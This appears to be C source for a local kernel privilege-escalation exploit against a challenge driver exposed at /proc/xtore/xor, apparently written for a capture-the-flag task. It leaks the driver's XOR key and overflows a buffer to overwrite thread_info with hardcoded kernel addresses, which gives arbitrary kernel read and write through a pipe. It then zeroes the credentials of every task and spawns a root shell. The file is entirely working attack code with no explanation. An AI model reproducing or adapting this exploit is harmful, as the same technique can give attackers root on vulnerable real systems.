#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>


unsigned char data[0x2000];
int pipefd[2];
size_t kernel_read(size_t addr){
	size_t ret = 0,n;
	n = write(pipefd[1],(void*)addr,sizeof(ret));
	n = read(pipefd[0],&ret,sizeof(ret));
	return ret;
}

void kernel_write(size_t addr,size_t val){
	size_t v = val,n;
	n = write(pipefd[1],&v,sizeof(v));
	n = read(pipefd[0],(void*)addr,sizeof(v));
}

int main(){

	if(fork()== 0){
		while( getuid() ) 
			sleep(1);
		int t = system("/bin/sh");
	}

	int tmp,n ;
	unsigned char key[0x100];
	unsigned char buf[0x100];
	memset(key,0,sizeof(key));
	memset(buf,'a',sizeof(buf));
	int xor_fd = open("/proc/xtore/xor",O_RDWR);
	n = write(xor_fd,buf,sizeof(buf));	
	n = read(xor_fd,buf,sizeof(buf));
	for(int i=0;i<0x100;i++)
		key[i] = buf[i]^'a';
	for(int i=0;i<sizeof(data);i++)
		data[i] = key[i&0xff]^0x41;

	size_t thread_info[25];
	memset(thread_info,0,sizeof(thread_info));
	thread_info[2] = 0xffffffff;
	thread_info[4] = 0x80437c08;
	thread_info[6] = 0x00000015;
	thread_info[7] = 0x81fad400;
	thread_info[9] = 0x80433360;
	thread_info[13] = 0x803072c0;
	thread_info[16] = 0x803009e8;
	thread_info[22] = 0x01000000;
	thread_info[24] = 0x0008a4c0;


	thread_info[3] =  0x80433360;
	thread_info[8] =  0x80433360;




	unsigned char* p = (char*)thread_info;
	for(int i=0;i<sizeof(thread_info);i++)
		data[i+0x1c38] = key[(i+0x1c38)&0xff]^p[i];

	n = write(xor_fd,data,0x1e00);
	n = pipe(pipefd);
	
	size_t task = kernel_read(0x804334bc);

	while( task != 0x804334bc ){
		size_t cred = kernel_read(task+0x15c);
		for(int i=0;i<9;i++)
			kernel_write(cred+i*4,0);
		task = kernel_read(task);
	}	

	while(1)
		sleep(100);










}
